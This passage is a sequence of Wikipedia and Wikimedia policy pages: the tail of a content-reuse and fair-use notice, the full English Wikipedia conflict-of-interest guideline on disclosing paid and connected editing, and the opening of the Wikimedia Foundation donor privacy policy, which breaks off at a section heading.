In such a case, the material should be identified as from an external source (on the image description page, or history page, as appropriate). As "fair use" is specific to the use that you contemplate it is best if your describe the fair use rationale for such specific use either in hidden text in the article or on the image description page. Remember what is fair use for Wikipedia may not be considered a fair use for your intended use of the content in another context.

For example, if we include an image under fair use, you must ensure that your use of the article also qualifies for fair use (this might not be the case, for example, if you were using a Wikipedia article for a commercial use that would otherwise be allowed by our licenses and the doctrine of fair use, would not be allowed under that commercial use). Re-users of Wikipedia images outside of the United States should also be aware that it may well be that fair use as it is known in the U.S. just may not exist at all in their jurisdiction. Most other countries have only well-defined exceptions for using copyrighted works without having been granted an explicit license. In the Commonwealth nations, there is fair dealing. Countries that follow the Berne Convention have similar exceptions for narrowly defined cases. Short quotations from copyrighted works are allowed, provided the source is properly attributed. What other exceptions may exist depends entirely of the laws of the country you're in.

Wikipedia does use some text under licenses that are compatible with the GFDL but may require additional terms that we do not require for original Wikipedia text (such as including Invariant Sections, Front-Cover Texts, or Back-Cover Texts). When using these materials, you have to include those invariant sections verbatim.

We try hard to identify the sources and licenses of all media such as text, images or sounds used in our encyclopedia articles. Still, we cannot guarantee that all media are used or marked correctly: for example, if an image description page states that an image was in the public domain, you should still check yourself whether that claim appears correct and decide for yourself whether your use of the image would be fine under the laws applicable to you. Wikipedia is primarily subject to U.S. law; re-users outside the U.S. should be aware that they are subject to the laws of their country, which almost certainly are different. Images published under the GFDL or one of the Creative Commons Licenses are unlikely to pose problems, as these are specific licenses with precise terms worldwide. Public domain images may need to be re-evaluated by a re-user because it depends on each country's copyright laws what is in the public domain there. There is no guarantee that something in the public domain in the U.S. was also in the public domain in your country.

This page documents an English Wikipedia behavioral guideline.

Editors should generally follow it, though exceptions may apply. Substantive edits to this page should reflect consensus. When in doubt, discuss first on this guideline's talk page.

Shortcut
 * WP:COI

This page in a nutshell: Editors should not edit where they have a conflict of interest, as such involvement may undermine the project’s neutrality. If paid or otherwise connected to the subject, disclosure and following the proper edit request process is required to maintain credibility.

Conflict of interest (COI) editing involves contributing to Wikipedia about yourself, family, friends, clients, employers, or your financial and other relationships. Any external relationship can trigger a conflict of interest. Someone having a conflict of interest is a description of a situation, not a judgment about that person's opinions, integrity, or good faith.

COI editing is strongly discouraged on Wikipedia. It undermines public confidence and risks causing public embarrassment to the individuals and companies being promoted. Editors with a COI are sometimes unaware of whether or how much it has influenced their editing. If COI editing causes disruption, an administrator may opt to place blocks on the involved accounts.

Editors with a COI, including paid editors, are expected to disclose it whenever they seek to change an affected article's content. Anyone editing for pay must disclose who is paying them, who the client is, and any other relevant affiliation; this is a requirement of the Wikimedia Foundation. COI editors are strongly discouraged from editing affected articles directly, and can propose changes on article talk pages instead. However, our policy on matters relating to living people allows very obvious errors to be fixed quickly, including by the subject.

When investigating COI editing, do not reveal the identity of editors against their wishes. Wikipedia's policy against harassment, and in particular the prohibition against disclosing personal information, takes precedence over this guideline. To report COI editing, follow the advice at How to handle conflicts of interest, below. Editors making or discussing changes to this guideline or related guidance shall disclose whether they have been paid to edit Wikipedia.


WIKIPEDIA'S POSITION


PURPOSE OF WIKIPEDIA

Further information: Wikipedia:What Wikipedia is not

As an encyclopedia, Wikipedia's mission is to provide the public with articles that summarize accepted knowledge, written neutrally and sourced reliably. Readers expect to find neutral articles written independently of their subject, not corporate or personal webpages, or platforms for advertising and self-promotion. Articles should contain only material that complies with Wikipedia's content policies and best practices, and Wikipedians must place the interests of the encyclopedia and its readers above personal concerns.


COI EDITING

See also: Wikipedia:Plain and simple conflict of interest guide

Shortcut
 * WP:COIEDIT

Editors with a COI should follow Wikipedia policies and best practices scrupulously:

 * you should disclose your COI when involved with affected articles;
 * you are strongly discouraged from editing affected articles directly;
 * you may propose changes on talk pages (by using the {{edit COI}} template), so that they can be peer-reviewed;
 * you should put new articles through the Articles for Creation (AfC) process instead of creating them directly;
 * you should not act as a reviewer of affected article(s) at AfC, new pages patrol or elsewhere;
 * you should respect other editors by keeping discussions concise.

Note that no one on Wikipedia controls articles. If Wikipedia hosts an article about you or your organization, others may add information that would otherwise remain little known. They may also decide to delete the article or decide to keep it should you later request deletion. The media has several times drawn attention to companies that engage in COI editing on Wikipedia (see Conflict-of-interest editing on Wikipedia), which has led to embarrassment for the organizations concerned.


PAID EDITING


Shortcuts
 * WP:PE
 * WP:PAY
 * WP:NOPR
 * WP:NOPAY
 * WP:FCOI

Being paid to contribute to Wikipedia is one form of financial COI; it places the paid editor in a conflict between their employer's goals and Wikipedia's goals. The kind of paid editing of most concern to the community involves using Wikipedia for public relations and marketing purposes. Sometimes called "paid advocacy," this is problematic because it invariably reflects the interests of the client or employer.

More generally, an editor has a financial conflict of interest whenever they write about a topic with which they have a close financial relationship. This includes being an owner, employee, contractor, investor or other stakeholder.

The Wikimedia Foundation requires that all paid editing be disclosed. Additionally, global policy requires that (if applicable) you must provide links on your user-page to all active accounts on external websites through which you advertise, solicit or obtain paid editing. If you receive or expect to receive compensation (money, goods or services) for your contributions to Wikipedia, the policy on the English Wikipedia is:

 * you must disclose who is paying you, on whose behalf the edits are made, and any other relevant affiliation;
 * you should make the disclosure on your user page, on affected talk pages, and whenever you discuss the topic;
 * you are strongly discouraged from editing affected articles directly;
 * you may propose changes on talk pages by using the {{edit COI}} template, so that they can be peer-reviewed;
 * you should put new articles through the Articles for Creation (AfC) process instead of creating them directly;
 * you must not act as a reviewer of affected article(s) at AfC, new pages patrol or elsewhere;
 * you should respect volunteers by keeping discussions concise (see WP:PAYTALK).

Requested edits are subject to the same standards as any other, and editors may decline to act on them. The guide to effective COI edit requests provides guidance in this area. To find an article's talk page, click the "talk" button at the top of the article. See WP:TEAHOUSE if you have questions about these things. If you are an administrator, you must not use administrative tools for any paid-editing activity (except when related to work as a Wikipedian-in-residence, or as someone paid by the Wikimedia Foundation or an affiliate).


WIKIMEDIA FOUNDATION TERMS OF USE

Further information: Wikipedia:Paid-contribution disclosure

The Wikimedia Foundation's terms of use require that editors who are being paid for their contributions disclose their employer (the person or organization who is paying for the edits); the client (the person or organization on whose behalf the edits are made); and any other relevant affiliation. This is the policy of the English Wikipedia.




HOW TO DISCLOSE A COI


GENERAL COI


Shortcuts
 * WP:DISCLOSE
 * WP:DCOI

If you become involved in an article where you have any COI, you should always let other editors know about it, whenever and wherever you discuss the topic. There are three venues to do this.

1. If you want to use a template to do this, place {{connected contributor}} at the top of the affected talk page, fill it in as follows, and save:

Connected contributor template
{{Connected contributor|User1=Your username|U1-declared=yes|U1-otherlinks=(Optional) Insert relevant affiliations, disclosures, article drafts or diffs showing COI contributions.}}

Note that someone else may add this for you.

2. You can also make a statement in the edit summary of any COI contribution.

3. If you want to note the COI on your user page, you can use the {{UserboxCOI}} template:

UserboxCOI template

Edit the source of your user page and type {{UserboxCOI|1=Wikipedia article name}}, then click "Publish page..." or "Publish changes...".

Example

> For a COI disclosure, see Talk:Steve Jobs
> In this edit, one editor added a COI declaration for another editor.

Also, if you propose significant or potentially controversial changes to an affected article, you can use the {{edit COI}} template. Place this at the bottom of the talk page and state your suggestion beneath it (be sure to sign it with four tildes, ~~~~). If the proposal is verifiable and appropriate, it will usually be accepted. If it is declined, the editor declining the request will usually add an explanation below your entry.






PAID EDITORS


Shortcuts
 * WP:COIPAYDISCLOSE
 * WP:COIDISCLOSEPAY
 * WP:UPE

Further information: Wikipedia:Paid-contribution disclosure
"WP:UPE" redirects here; not to be confused with Wikipedia:Use plain English.

If you are being paid for your contributions to Wikipedia, you must declare who is paying you, who the client is, and any other relevant role or relationship. You may do this on your user page, on the talk page of affected articles, or in your edit summaries. As you have a conflict of interest, you must ensure everyone with whom you interact is aware of your paid status, in all discussions on Wikipedia pages within any namespace. If you want to use a template to disclose your COI on a talk page, place {{connected contributor (paid)}} at the top of the page, fill it in as follows, and save:

Connected contributor (paid) template
{{Connected contributor (paid)|User1=Username of the paid editor|U1-employer=Name of person/organization that is paying for the edits|U1-client= Name of client|U1-otherlinks=Insert diff to disclosure on your User page.}}

The employer is whoever is paying you to be involved in the article (such as a PR company). The client is on whose behalf the payment is made (usually the subject of the article). If the employer and client are the same entity—that is, if Acme Corporation is paying you to write about Acme Corporation—the client parameter may be left empty. See {{connected contributor (paid)}} for more information. Note that other editors may add this template for you. Paid editing without such a declaration is called undisclosed paid editing (UPE).

You are expected to maintain a clearly visible list on your user page of your paid contributions. If you advertise, solicit or obtain paid editing work via an account on any external website, you must provide links on your user-page to all such accounts.

If you propose changes to an affected article, you can use the {{edit COI}} template. Post it on the talk page and make your suggestion underneath it.

The use of administrative tools as part of any paid editing activity, except as a Wikipedian-in-Residence, or when the payment is made by the Wikimedia Foundation or an affiliate of the WMF, is considered a serious misuse and likely to result in sanctions or their removal.


WHAT IS CONFLICT OF INTEREST?


EXTERNAL ROLES AND RELATIONSHIPS


Shortcut
 * WP:EXTERNALREL

While editing Wikipedia, an editor's primary role is to further the interests of the encyclopedia. When an external role or relationship could reasonably be said to undermine that primary role, the editor has a conflict of interest similar to how a judge's primary role as an impartial adjudicator would be undermined if they were married to one of the parties.

Any external relationship—personal, religious, political, academic, legal, or financial (including holding a cryptocurrency)—can trigger a COI. How close the relationship needs to be before it becomes a concern on Wikipedia is governed by common sense. For example, an article about a band should not be written by the band's manager, and a biography should not be an autobiography or written by the subject's spouse. There can be a COI when writing on behalf of a competitor or opponent of the page subject, just as there is when writing on behalf of the page subject.

Subject-matter experts (SMEs) are welcome on Wikipedia within their areas of expertise, subject to the guidance below on financial conflict of interest and on citing your work. SMEs are expected to make sure that their external roles and relationships in their field of expertise do not interfere with their primary role on Wikipedia.


COI IS NOT SIMPLY BIAS

Further information: WP:ADVOCACY

Shortcut
 * WP:COINOTBIAS

Determining that someone has a COI is a description of a situation. It is not a judgment about that person's state of mind or integrity. A COI can exist in the absence of bias, and bias regularly exists in the absence of a COI. Beliefs and desires may lead to biased editing, but they do not constitute a COI. COI emerges from an editor's roles and relationships, and the tendency to bias that we assume exists when those roles and relationships conflict.


WHY IS CONFLICT OF INTEREST A PROBLEM?

On Wikipedia, editors with a conflict of interest who unilaterally add material tend to violate Wikipedia's content and behavioral policies and guidelines. The content they add is typically unsourced or poorly sourced and often violates the neutral point of view policy by being promotional and omitting negative information. They may edit war to retain content that serves their external interest. They may overuse primary sources or non-independent sources, and they may give too much weight to certain ideas.


ACTUAL, POTENTIAL AND APPARENT COI


Shortcuts
 * WP:ACTUALCOI
 * WP:POTENTIALCOI
 * WP:APPARENTCOI

An actual COI exists when an editor has a COI with respect to a certain judgment and is in a position where the judgment must be exercised.

Example: A business owner has an actual COI if they edit articles and engage in discussions about that business.

A potential COI exists when an editor has a COI with respect to a certain judgment but is not in a position where the judgment must be exercised.

Example: A business owner has a potential COI with respect to articles and discussions about that business, but they have no actual COI if they stay away from those pages.

An apparent COI exists when there is reason to believe that an editor has a COI.

Example: Editors have an apparent COI if they edit an article about a business, and for some reason they appear to be the business owner or in communication with the business owner, although they may actually have no such connection. Apparent COI raises concern within the community and should be resolved through discussion whenever possible.


DEALING WITH EDIT REQUESTS FROM COI OR PAID EDITORS

Further information: Wikipedia:Edit requests


RESPONDING TO REQUESTS


Shortcut
 * WP:COIRESPONSE

Editors responding to edit requests from COI or paid editors are expected to do so carefully, particularly when commercial interests are involved. When large amounts of text are added to an article on behalf of the article subject, the article has, in effect, been ghostwritten by the subject without the readers' knowledge. Responding volunteers should therefore carefully check the proposed text and sources. That an article has been expanded does not mean that it is better.

 * Make sure the proposed paid text complies with WP:WEIGHT.
 * Look for unnecessary detail that may have been added to overwhelm something negative.
 * Make sure nothing important is missing. Responding editors should do their own search for independent sources. Do not rely on the sources offered by the paid editor.
 * Look for non-neutral language and unsourced or poorly sourced content.
 * Be cautious about accepting content based on self-published sources such as a personal website, or primary sources such as a company website or press release.

If the paid text is added to the article, the edit summary should include full attribution.


ATTRIBUTION IN EDIT SUMMARIES

Further information: Wikipedia:Copying within Wikipedia and Wikipedia:Copying text from other sources

Shortcuts
 * WP:COIATTRIBUTE
 * WP:PAIDATTRIBUTE

If editors choose to add material to an article on behalf of a COI or paid editor, they must provide attribution for the text in the edit summary. The edit summary should include the name of the COI or paid editor, a link to the draft or edit request, and that the edit contains a COI or paid contribution. For example:

Text inserted on behalf of paid editor User:X; copied from [[Draft:Paid draft]].

or you can also use the following format, from text requested in a talk page,

Edit made due to [[WP:COI]] edit request by User:SVeatch; copied or adapted from "Revisions to Infobox, Introduction and History" at [[Special:Permalink/1213729307]]

PAID EDITORS ON TALK PAGES


Shortcuts
 * WP:COITALK
 * WP:PAYTALK

Paid editors must respect the volunteer nature of the project and keep discussions concise. When proposing changes to an article, they should describe the suggested modifications and explain why the changes should be made. Any changes that may be contentious, such as removal of negative text, should be highlighted.

Before being drawn into long exchanges with paid editors, volunteers should be aware that paid editors may be submitting evidence of their talk-page posts to justify their salaries or fees. No editor should be expected to engage in long or repetitive discussions with someone who is being paid to argue with them.

Editors who refuse to accept a consensus by arguing ad nauseam may find themselves in violation of the guideline against disruptive editing.


COPYRIGHT OF PAID CONTRIBUTIONS

See also: Work for hire

Shortcuts
 * WP:COICOPYRIGHT
 * WP:PAIDCOPYRIGHT

Editors are reminded that any text they contribute to Wikipedia, assuming they own the copyright, is irrevocably licensed under a Creative Commons-Attribution-Sharealike license and the GNU Free Documentation License. Content on Wikipedia, including article drafts and talk-page comments, can be freely copied and modified by third parties for commercial and non-commercial use, with the sole requirement that it be attributed to Wikipedia contributors.

Paid editors must ensure that they own the copyright of text they have been paid to add to Wikipedia; otherwise, they are unable to release it. A text's author is normally assumed to be the copyright holder. Companies sometimes provide paid editors with text written by someone else. Alternatively, a paid editor might write text for Wikipedia within the scope of their employment (a "work for hire"), in which case copyright resides with the employer.

Where there is doubt that the paid editor owns the copyright, they (or the employer or author) are advised to forward a release from the copyright holder to the Volunteer Response Team (permissions-enwikimedia.org). See WP:PERMISSION for how to do this and Wikipedia:Declaration of consent for all enquiries for a sample letter.

If editors choose to add material to an article on behalf of a paid editor, they must provide attribution for the text in the edit summary. See WP:COIATTRIBUTE for how to do this.

US: FEDERAL TRADE COMMISSION, STATE LAW, AND NATIVE ADVERTISING

See also: Native advertising, Consumer protection, and Direct-to-consumer advertising

All editors are expected to follow United States law on undisclosed advertising, which is described by the Federal Trade Commission (FTC) at Endorsement Guidelines and Dot Com Disclosures. The FTC regards advertising as deceptive if it mimics a content format, such as a news report, that appears to come from an independent, impartial source:

> Marketers and publishers are using innovative methods to create, format, and deliver digital advertising. One form is "native advertising", content that bears a similarity to the news, feature articles, product reviews, entertainment, and other material that surrounds it online. ...
> 
> 
> 
> In digital media, native ads often resemble the design, style, and functionality of the media in which they are disseminated. ... The more a native ad is similar in format and topic to content on the publisher's site, the more likely that a disclosure will be necessary to prevent deception. —Federal Trade Commission, 2015

To judge whether an ad is deceptive under the Federal Trade Commission Act of 1914, the FTC considers "both what the ad says and the format it uses to convey that information ... Advertisements or promotional messages are deceptive if they convey to consumers expressly or by implication that they’re independent, impartial, or from a source other than the sponsoring advertiser ...".

State law may have similar prohibitions. While the FTC law may apply only to interstate and foreign commerce, state law applies to intrastate commerce and must be obeyed. At least one state court case found liability for an ad disguised as editorial content.[citation needed]


EUROPEAN FAIR-TRADING LAW

See also: Unfair Commercial Practices Directive

In 2012 the Munich Oberlandesgericht court ruled that if a company or its agents edit Wikipedia with the aim of influencing customers, the edits constitute covert advertising, and as such are a violation of European fair-trading law. The ruling stated that readers cannot be expected to seek out user and talk pages to find editors' disclosures about their corporate affiliation.


UK ADVERTISING STANDARDS AUTHORITY

The Advertising Standards Authority (ASA) in the UK found in 2012 that the content of tweets from two footballers had been "agreed with the help of a member of the Nike marketing team". The tweets were not clearly identified as Nike marketing communications and were therefore in breach of the ASA's code.


ADVERTISING STANDARDS CANADA

The Canadian Code of Advertising Standards, administered by Advertising Standards Canada, states: "No advertisement shall be presented in a format or style that conceals the fact that it is an advertisement."


OTHER CATEGORIES OF COI


LEGAL AND OTHER DISPUTES

Further information: WP:BLPCOI

Shortcuts
 * WP:COIBLP
 * WP:COILEGAL

The biographies of living persons policy says: "[A]n editor who is involved in a significant controversy or dispute with another individual – whether on- or off-wiki – or who is an avowed rival of that individual, should not edit that person's biography or other material about that person, given the potential conflict of interest."

Similarly, editors should not write about court cases in which they or those close to them have been involved, nor about parties or law firms associated with the cases.


CAMPAIGNING, POLITICAL


Shortcuts
 * WP:COICAMPAIGN
 * WP:COIPOLITICAL

See also: WP:ADVOCACY

Activities regarded by insiders as simply "getting the word out" may appear promotional or propagandistic to the outside world. If you edit articles while involved with campaigns in the same area, you may have a conflict of interest. Political candidates and their staff should not edit articles about themselves, their supporters, or their opponents. Government employees should not edit articles about their agencies, government, political party, political opponents, or controversial political topics.


WRITING ABOUT YOURSELF, FAMILY, FRIENDS

"WP:COS" redirects here. For the "credible claim of significance" essay, see Wikipedia:Credible claim of significance.
Further information: Wikipedia:Autobiography and WP:BLPCOI

Shortcuts
 * WP:COISELF
 * WP:SELFPROMOTE

You should generally refrain from creating articles about yourself, or anyone you know, living or dead, unless through the Articles for Creation process. If you have a personal connection to a topic or person with an existing article, you are advised to refrain from editing that article directly and to provide full disclosure of the connection if you comment about the article on talk pages or in other discussions. Requests for updates to an article about yourself or someone with whom you have a personal connection can be made on the article's talk page by following the instructions at WP:COIREQ.

An exception to not editing an article about yourself or someone you know is made if the article contains defamation or a serious error that needs to be corrected quickly. If you do make such an edit, please follow it up with an email to WP:VRT, Wikipedia's volunteer response team, or ask for help on WP:BLPN, our noticeboard for articles about living persons, or the talk page of the article in question.


CITING YOURSELF


Shortcut
 * WP:SELFCITE

"WP:SELFCITE" redirects here. For Wikipedia citing itself, see WP:CIRCULAR.
See also: WP:MEDCOI

Using material you have written or published is allowed within reason, but only if it is relevant, conforms to the content policies, including WP:SELFPUB, and is not excessive. Citations should be in the third person and should not place undue emphasis on your work. You will be permanently identified in the page history as the person who added the citation to your own work. When in doubt, defer to the community's opinion: propose the edit on the article's talk page and allow others to review it. However, adding numerous references to work published by yourself and none by other researchers is considered to be a form of spamming.


CULTURAL SECTOR

"WP:CURATOR" redirects here. For the tool used by Wikipedia:New pages patrol, see Wikipedia:Page Curation.
Further information: Wikipedia:GLAM, Wikipedia:Advice for the cultural sector, and Wikipedia:The Wikipedia Library/Cultural Professionals

Shortcut
 * WP:CURATOR

Museum curators, librarians, archivists, and similar are encouraged to help improve Wikipedia, or to share their information in the form of links to their resources. If a link cannot be used as a reliable source, it may be placed under further reading or external links if it complies with the external links guideline. Bear in mind that Wikipedia is not a mirror or a repository of links, images, or media files.

See also WP:Expert editors.


WIKIPEDIANS IN RESIDENCE


Shortcut
 * WP:WIRCOI

There are forms of paid editing that the Wikimedia community regards as acceptable. These include Wikipedians in residence (WiRs)—Wikipedians who may be paid to collaborate with mission-aligned organizations, such as galleries, libraries, archives, and museums. WiRs must not engage in public relations or marketing for their organization in Wikipedia, and they should operate within the bounds defined by Core characteristics of a Wikipedian in Residence at Wikimedia Outreach. They must work closely with a Wikipedia project or the general Wikipedia community, and are expected to identify their WiR status on their user page and on talk pages related to their organization when they post there.


REWARD BOARD

Another example of acceptable paid editing is the reward board, where editors can post incentives, usually to raise articles to featured-article or good-article status. If you participate in this, transparency and neutrality are key.


MISCELLANEOUS


SOLICITATIONS BY PAID EDITORS

In any solicitation sent to a prospective client, paid editors should disclose the following information:

 * Paid editors do not represent the Wikimedia Foundation nor the Wikipedia editing community, and they have no authority beyond that of any volunteer editor.
 * Paid editors must disclose their employer, client, and affiliations on Wikipedia. There is no confidentiality for the client.
 * Paid edits may be reviewed and revised in the normal course of work on Wikipedia. Neither the client nor the paid editor owns the article.
 * Paid editors cannot guarantee any outcome for an article on Wikipedia. It can be revised or deleted by other editors at any time.

Providing a client with a link to this section is appropriate disclosure if it is done in a neutral and non-deceptive manner.

 * Paid editors must also provide a link to their user page which includes a declaration of their paid editing status. If an external website claims that a particular Wikipedia editor works for them, but that editor's user page has no such declaration, this is likely to indicate that the website is impersonating that editor.

If you received a solicitation from a paid editor that does not include this information, we recommend that you not do business with them. They are not following our policies and guidelines.

BEWARE OF SCAMS


Shortcut
 * WP:BEWARESCAM

Further information: Wikipedia:Articles for creation/Scam warning

Some solicitations from paid editors have been linked to fraud; see for example Operation Orangemoody. A large number of businesses claim to offer editing services, but some of these are scams. If someone claims that experienced editors work for them, ask them for the user names of those editors and check the corresponding editor user pages for a paid-contribution disclosure; its absence likely indicates that the claim is false. Offers to guarantee that a page will be saved from deletion, in return for significant sums of money, are always fraudulent, as are offers to use special privileges on Wikipedia.

If you think you've received a fraudulent solicitation, please forward it to paid-en-wpwikipedia.org for investigation.


LAW OF UNINTENDED CONSEQUENCES

Further information: Wikipedia:Wikipedia is in the real world

Shortcut
 * WP:LUC

Once an article is created about yourself, your group, or your company, you have no right to control its content, or to delete it outside the normal channels. If there is anything publicly available on a topic that you would not want to have included in an article, it will probably find its way there eventually.


NO SHARED ACCOUNTS, NO COMPANY ACCOUNTS

Further information: WP:NOSHARE and WP:ORGNAME

Do not create a shared organizational account, or use the name of an organization as the account name. The account is yours, not your employer's.


MAKING UNCONTROVERSIAL EDITS


Shortcuts
 * WP:COIADVICE
 * WP:COIU

Editors who have a general conflict of interest may make unambiguously uncontroversial edits (but see WP:FINANCIALCOI). They may:

 1. remove spam and unambiguous vandalism,
 2. remove unambiguous violations of the biography of living persons policy,
 3. fix spelling, grammatical, or markup errors,
 4. repair broken links,
 5. remove their own COI edits, and
 6. add independent reliable sources when another editor has requested them, although it is better to supply them on the talk page for others to add.

If another editor objects for any reason, it is not an uncontroversial edit. Edits not covered by the above should be discussed on the article's talk page. If an article has few uninvolved editors, ask at the talk page of a related WikiProject or at the COI noticeboard. See also WP:COITALK.


SUPPLYING PHOTOGRAPHS AND MEDIA FILES

Editors with a COI are encouraged to upload high-quality media files that are appropriately licensed for Wikipedia and that improve our coverage of a subject. For more information, follow the instructions at Commons. In some cases, the addition of media files to an article may be an uncontroversial edit that editors with a COI can make directly, but editors should exercise discretion and rely on talk pages when images may be controversial or promotional. If the addition of an image is challenged by another editor, it is controversial.

The use of non-free contents are restricted. Generally, using press photos or images provided by client who wish to feature them in the article but unwilling to irrevocably release the copyright under Creative Commons is unacceptable. Editors may not upload images provided by client for "Wikipedia article purpose only" and falsely claim they're licensed under CC BY-SA, as such photos are fundamentally incompatible with free content principles. Only the copyright owner or their authorized representatives may grant permission to use a work under a Creative Commons license, not the photographed subject or their public relations agent. If the same image is found copyrighted elsewhere prior to the upload date, it may be removed as a copyright violation. If you are the copyright owner and want to release content to Creative Commons for use on Wikipedia, see Commons:Volunteer Response Team § Licensing images: when do I contact VRT?.


HOW TO HANDLE CONFLICTS OF INTEREST


ADVOCACY, NOTICEBOARDS

Main pages: Wikipedia:Neutral point of view/Noticeboard and Wikipedia:Reliable sources/Noticeboard

If a user's edits lead you to believe that they might have a COI (that is, if they have an "apparent COI"), and there has been no COI disclosure, consider first whether the issue may be simple advocacy. Most advocacy does not involve COI. Whether an editor is engaged in advocacy should first be addressed at the user's talk page, then at WP:NPOVN, the neutral-point-of-view noticeboard. The appropriate forum for concerns about sources is WP:RSN, the reliable-sources noticeboard. If there are concerns about sockpuppets or meatpuppets, please bring that concern to WP:SPI.


REPORTING TO THE CONFLICT OF INTEREST NOTICEBOARD

Main page: Wikipedia:Conflict of interest/Noticeboard

Shortcut
 * WP:COICOIN

If you believe an editor has an undisclosed COI and is editing in violation of this guideline, raise the issue in a civil manner on the editor's talk page, which is the first step in resolving user-conduct issues, per the dispute resolution policy, citing this guideline. If that fails to resolve the issue, such as when an editor has repeatedly added problematic material over an extended period, then open a discussion at the conflict of interest noticeboard (COIN). This also applies to a disclosed COI that is causing a problem: for example, an acknowledged BLP subject who is editing their own BLP.

During the COIN discussion, avoid making disparaging remarks about the user in question, their motives or the subject of the article(s).

Post whatever public evidence you have to support that there is a COI, or that it is causing a problem, in the form of edits by that user or information the user has posted about themselves. Do not post private information; see WP:OUTING, which is policy, and the section below, "Avoid outing".

If private information must be shared to resolve a COI issue, it may be emailed to paid-en-wpwikipedia.org. Follow the advice in WP:OUTING: "Only the minimum information necessary should be conveyed and the minimum number of people contacted." The priority should be to avoid unnecessary privacy violations.


AVOID OUTING


Shortcut
 * WP:AVOIDOUTING

Further information: Wikipedia:Harassment § Posting of personal information, and Wikipedia:Wikimedia Foundation statement on paid editing and outing

When investigating COI editing, the policy against harassment takes precedence. It requires that Wikipedians not reveal the identity of editors against their wishes. Examine editors' behavior instead and seek advice by email if necessary. Do not ask a user if they are somebody; instead one can ask if they have an undisclosed connection to that person. If revealing private information is needed to resolve COI editing, and if the issue is serious enough to warrant it, editors can email paid-en-wpwikipedia.org. Also see the section "Reporting to the conflict of interest noticeboard" above.


DEALING WITH SINGLE-PURPOSE ACCOUNTS

Further information: Wikipedia:Blocking policy § Disruption-only, and Wikipedia:Single-purpose account

Accounts that appear to be single-purpose, existing for the sole or primary purpose of promotion or denigration of a person, company, product, service, website, organization, etc., and whose postings are in apparent violation of this guideline, should be made aware of this guideline and warned not to continue their problematic editing. If the same pattern of editing continues after the warning, the account may be blocked.


TEMPLATES

Relevant article talk pages may be tagged with {{connected contributor}} or {{connected contributor (paid)}}. The article itself may be tagged with {{COI}}. A section of an article can be tagged with {{COI|section}}

Other templates include:

 * {{uw-coi}} (to be placed on user Talk pages to warn editors that they may have a conflict of interest)
 * {{uw-coi-username}} (another Talk page warning, this one for editors whose username appears to violate the WP:Usernames policy)
 * {{COI editnotice}} (this template goes on article talk pages and gives instructions to COI editors on how to submit edit requests to the article)
 * {{User COI}} (userbox for users to self-declare on their own Userpages those articles with which they have a conflict of interest; userbox can list up to nine articles)

This page documents the Wikimedia Foundation's donor privacy policy. You can make a donation to the Wikimedia Foundation at donate.wikimedia.org.


WELCOME!

Welcome to the Wikimedia Foundation's Donor Privacy Policy. The Wikimedia Foundation ("WMF") has put this policy in place to protect the privacy rights of our donors. We recognize that our donors care deeply about how their personal information is used and shared, and we value the privacy and security of our donors. This Donor Privacy Policy addresses our practices for collecting, using, maintaining, protecting, and disclosing donor information. Please carefully read this policy together with our Terms of Use. We will never sell, trade, or rent your nonpublic personal information.


IMPORTANT INFORMATION

By donating to WMF, you understand that your donation entails the collection, transfer, processing, storage, disclosure, and use of your information in or to the United States ("U.S."), and other locations that may have different or less stringent data protection laws than your country, for the purposes stated in this policy. If you do not agree with the terms of the Donor Privacy Policy and the WMF Terms of Use, please immediately discontinue use of Wikimedia Fundraising Services (as defined below).


DEFINITIONS

"WMF", "us", "we", and "our" refer to the Wikimedia Foundation.

"Donor Privacy Policy" and "policy" refers to this document.

"Personal Information" is information you provide us or information we collect from or about you through the Fundraising Services that identifies or could be used to identify you. For more information, please see What Information We Collect.

"Wikimedia Fundraising Services" are Wikimedia Foundation fundraising sites, such as donate.wikimedia.org, as well as fundraising-related emails from WMF and fundraising-related banners on other Wikimedia Foundation sites.


WHAT THIS POLICY COVERS

This Donor Privacy Policy covers the collection, transfer, processing, storage, disclosure, and use of information collected from you during the process of making a donation to the Wikimedia Foundation and through your interactions with the Wikimedia Fundraising Services ("Donor Information"). This policy does not cover the collection, transfer, processing, storage, disclosure, or use of your information related to your use of other WMF projects or features, such as Wikipedia. For more information regarding WMF's privacy practices in that respect, please review our main Privacy Policy. This policy also does not cover the collection, transfer, processing, storage, disclosure, and use of information collected from you during the process of making a donation to, or other interactions you may have with, a Wikimedia affiliate, such as a chapter. For more information about the privacy practices of those organizations, please review their respective privacy policies.


WHAT INFORMATION WE COLLECT

As a result of your interaction with our donation pages, making a donation, participating in a donor survey or providing feedback related to donating, or otherwise using the Wikimedia Fundraising Services, WMF may collect certain Personal Information, such as your name, contact details (such as address, phone number, email address, identification number on government-issued ID), financial information (such as bank account number), device details (such as IP address, web browser user-agent information), demographic details (such as gender or age) and information about your interests and affiliations. We also collect such Personal Information about U.S. donors through publicly-available sources and other commercially available sources.

We also collect or automatically receive some other information, such as:

 * the web page that referred you to our donation pages;
 * the amount you donated;
 * which of our pages you request and visit;
 * the date and time of each request you make to our donation pages;
 * comments and suggestions from you;
 * correspondence between you and WMF; and
 * any other information you provide to us.

We keep Donor Information confidential, meaning that we will not share this information outside of the Wikimedia Foundation except as permitted by this policy or in de-identified form.


COOKIES AND OTHER TRACKING TECHNOLOGIES

As you interact with the Wikimedia Fundraising Services, we may use automatic data collection and other locally stored data technologies such as tracking pixels, JavaScript, cookies, and local storage to collect certain information about your device.

WMF uses cookies and other locally stored data to enhance your donation experience. We also use this information to create a safer online environment and gain a better understanding of donor preferences and interactions with the Wikimedia Fundraising Services. In general, cookies and other locally stored data are used to:

 * Help the Wikimedia Fundraising Services function and deliver new and relevant content to you;
 * Provide you with a personalized experience by storing your preferences so that they can be used the next time you visit the Wikimedia Fundraising Services;
 * Analyze the performance of donation processes so that we can better understand how they work and improve them for you and other WMF donors; and
 * Analyze interactions with fundraising emails so we can refine and improve the donation process.

For additional information about the use of cookies and similar tracking technologies, please see our Cookie statement.


LIMITING DATA COLLECTION BY COOKIES AND OTHER TRACKING TECHNOLOGIES

We believe that the collection of this data helps improve your donation experience; however, you may remove or disable some or all cookies through your browser settings. While not a comprehensive list, you can limit the use of cookies and other locally stored data on your device by:

 * Removing or disabling specific locally stored data on your browser's settings;
 * Using a browser that can block-third party cookies; and
 * Installing a plugin to block locally stored data, if available.

Although donations to WMF via the Wikimedia Fundraising Services are possible without cookies and other locally stored data, please note that the removal or disabling of these features may affect your navigation of these sites and the personalization of your experience.


DO NOT TRACK

